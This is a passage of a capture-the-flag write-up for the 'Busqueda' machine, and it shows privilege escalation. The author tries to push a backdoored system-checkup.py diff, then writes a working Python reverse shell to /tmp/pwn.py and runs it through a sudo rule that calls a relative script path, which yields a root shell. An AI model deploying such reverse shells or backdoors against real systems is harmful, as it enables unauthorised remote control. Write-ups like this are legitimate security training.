+<span class="w"> </span><span class="m">1</span><span class="w"> </span>file<span class="w"> </span>changed,<span class="w"> </span><span class="m">12</span><span class="w"> </span>insertions<span class="o">(</span>+<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>deletion<span class="o">(</span>-<span class="o">)</span>
+
+git<span class="w"> </span>diff<span class="w"> </span>origin/main
+diff<span class="w"> </span>--git<span class="w"> </span>a/system-checkup.py<span class="w"> </span>b/system-checkup.py
+index<span class="w"> </span>5e20399..01cf441<span class="w"> </span><span class="m">100755</span>
+---<span class="w"> </span>a/system-checkup.py
++++<span class="w"> </span>b/system-checkup.py
+@@<span class="w"> </span>-1,8<span class="w"> </span>+1,10<span class="w"> </span>@@
+<span class="w"> </span><span class="c1">#!/bin/bash</span>
+<span class="w"> </span>import<span class="w"> </span>subprocess
+<span class="w"> </span>import<span class="w"> </span>sys
++import<span class="w"> </span>socket
++import<span class="w"> </span>os
+
+-actions<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s1">&#39;full-checkup&#39;</span>,<span class="w"> </span><span class="s1">&#39;docker-ps&#39;</span>,<span class="s1">&#39;docker-inspect&#39;</span><span class="o">]</span>
++actions<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s1">&#39;full-checkup&#39;</span>,<span class="w"> </span><span class="s1">&#39;docker-ps&#39;</span>,<span class="w"> </span><span class="s1">&#39;docker-inspect&#39;</span>,<span class="w"> </span><span class="s1">&#39;pwn-me&#39;</span><span class="o">]</span>
+
+<span class="w"> </span>def<span class="w"> </span>run_command<span class="o">(</span>arg_list<span class="o">)</span>:
+<span class="w">     </span><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>subprocess.run<span class="o">(</span>arg_list,<span class="w"> </span><span class="nv">capture_output</span><span class="o">=</span>True<span class="o">)</span>
+@@<span class="w"> </span>-15,6<span class="w"> </span>+17,15<span class="w"> </span>@@<span class="w"> </span>def<span class="w"> </span>run_command<span class="o">(</span>arg_list<span class="o">)</span>:
+
+
+<span class="w"> </span>def<span class="w"> </span>process_action<span class="o">(</span>action<span class="o">)</span>:
++
++<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nv">action</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;pwn-me&#39;</span>:
++<span class="w">        </span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
++<span class="w">        </span>s.connect<span class="o">((</span><span class="s2">&quot;10.10.14.39&quot;</span>,4000<span class="o">))</span>
++<span class="w">        </span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span>
++<span class="w">        </span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span>
++<span class="w">        </span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span>
++<span class="w">        </span>pty.spawn<span class="o">(</span><span class="s2">&quot;sh&quot;</span><span class="o">)</span>
++
+<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="nv">action</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;docker-inspect&#39;</span>:
+<span class="w">         </span>try:
+<span class="w">             </span><span class="nv">_format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sys.argv<span class="o">[</span><span class="m">2</span><span class="o">]</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>git<span class="w"> </span>push<span class="w"> </span>--force
+Username<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;http://127.0.0.1:3000&#39;</span>:<span class="w"> </span>administrator
+Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;http://administrator@127.0.0.1:3000&#39;</span>:
+Enumerating<span class="w"> </span>objects:<span class="w"> </span><span class="m">5</span>,<span class="w"> </span><span class="k">done</span>.
+Counting<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">5</span>/5<span class="o">)</span>,<span class="w"> </span><span class="k">done</span>.
+Delta<span class="w"> </span>compression<span class="w"> </span>using<span class="w"> </span>up<span class="w"> </span>to<span class="w"> </span><span class="m">4</span><span class="w"> </span>threads
+Compressing<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">3</span>/3<span class="o">)</span>,<span class="w"> </span><span class="k">done</span>.
+Writing<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">3</span>/3<span class="o">)</span>,<span class="w"> </span><span class="m">473</span><span class="w"> </span>bytes<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">473</span>.00<span class="w"> </span>KiB/s,<span class="w"> </span><span class="k">done</span>.
+Total<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>delta<span class="w"> </span><span class="m">2</span><span class="o">)</span>,<span class="w"> </span>reused<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>delta<span class="w"> </span><span class="m">0</span><span class="o">)</span>,<span class="w"> </span>pack-reused<span class="w"> </span><span class="m">0</span>
+error:<span class="w"> </span>remote<span class="w"> </span>unpack<span class="w"> </span>failed:<span class="w"> </span>unable<span class="w"> </span>to<span class="w"> </span>create<span class="w"> </span>temporary<span class="w"> </span>object<span class="w"> </span>directory
+To<span class="w"> </span>http://127.0.0.1:3000/administrator/scripts.git
+<span class="w"> </span>!<span class="w"> </span><span class="o">[</span>remote<span class="w"> </span>rejected<span class="o">]</span><span class="w"> </span>main<span class="w"> </span>-&gt;<span class="w"> </span>main<span class="w"> </span><span class="o">(</span>unpacker<span class="w"> </span>error<span class="o">)</span>
+error:<span class="w"> </span>failed<span class="w"> </span>to<span class="w"> </span>push<span class="w"> </span>some<span class="w"> </span>refs<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;http://127.0.0.1:3000/administrator/scripts.git&#39;</span>
+</pre></div>
+</div>
+<p>😥 back to the drawing board</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>reset<span class="w"> </span>--hard<span class="w"> </span>origin/main
+HEAD<span class="w"> </span>is<span class="w"> </span>now<span class="w"> </span>at<span class="w"> </span>b9a29dc<span class="w"> </span>Initial<span class="w"> </span>commit
+</pre></div>
+</div>
+<p>Looking at the full-checkup thing, the issue is quite obvious</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span>    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="s1">&#39;full-checkup&#39;</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;./full-checkup.sh&#39;</span><span class="p">]</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Done!&#39;</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Something went wrong&#39;</span><span class="p">)</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>All that’s left to do is to drop a reverse shell<br />
+And run the sudo line from the current directory</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:~$<span class="w"> </span>vim<span class="w"> </span>/tmp/pwn.py
+svc@busqueda:~$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/pwn.py
+svc@busqueda:~$<span class="w"> </span>cat<span class="w"> </span>/tmp/pwn.py
+<span class="c1">#!/usr/bin/python3</span>
+import<span class="w"> </span>socket
+import<span class="w"> </span>subprocess
+import<span class="w"> </span>os
+import<span class="w"> </span>pty
+<span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
+s.connect<span class="o">((</span><span class="s2">&quot;10.10.14.207&quot;</span>,4000<span class="o">))</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span>
+os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span>
+pty.spawn<span class="o">(</span><span class="s2">&quot;sh&quot;</span><span class="o">)</span>
+</pre></div>
+</div>
+<p>It took me way to long to figure this one out</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:/tmp$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/scripts/system-checkup.py<span class="w"> </span>full-checkup
+</pre></div>
+</div>
+<p>But we finally got there</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4000</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4000</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.207<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.11.208<span class="o">]</span><span class="w"> </span><span class="m">38290</span>
+<span class="c1"># id</span>
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+<span class="c1">#</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../codify/codify.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Codify</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../analytics/analytics.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Analytics</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Busqueda</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#privesc">Privesc</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
